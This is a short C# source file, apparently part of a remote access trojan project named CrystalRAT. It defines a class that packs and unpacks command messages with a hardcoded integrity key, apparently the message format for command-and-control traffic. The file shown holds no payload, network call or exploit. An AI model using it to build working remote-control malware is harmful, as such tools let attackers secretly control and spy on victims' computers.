using CrystalRATShared.Commands;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace CrystalRATShared.Serialization
{
    public static class CommandDataSerializer
    {
        public delegate void SerializeArguments(BinaryWriter writer);
        public delegate void CommandHandler(CommandFlags flag, BinaryReader reader);

        private static readonly string integrityKey = @"{3173FE71-0E6E- 4E30- B72B-E38FB0DF650E }";

        public static byte[] Serialize(CommandFlags flag, SerializeArguments args = null)
        {
            byte[] data;

            using (MemoryStream ms = new MemoryStream())
            {
                using (BinaryWriter writer = new BinaryWriter(ms, Encoding.UTF8))
                {
                    writer.Write((int)flag);
                    writer.Write(integrityKey);
                    args?.Invoke(writer);
                }

                data = ms.ToArray();
            }

            return data;
        }

        public static CommandFlags Deserialize(byte[] input, CommandHandler handler = null)
        {

            CommandFlags flag;

            using (MemoryStream ms = new MemoryStream(input))
            {
                using (BinaryReader reader = new BinaryReader(ms, Encoding.UTF8))
                {
                    try
                    {
                        flag = (CommandFlags)reader.ReadInt32();
                        if (integrityKey == reader.ReadString())
                        {
                            handler?.Invoke(flag, reader);
                        }
                        else
                        {
                            throw new ArgumentException("Integrity key does not match.");
                        }
                    }
                    catch
                    {
                        flag = CommandFlags.DataCorrupted;
                    }
                }
            }

            return flag;
        }



    }
}
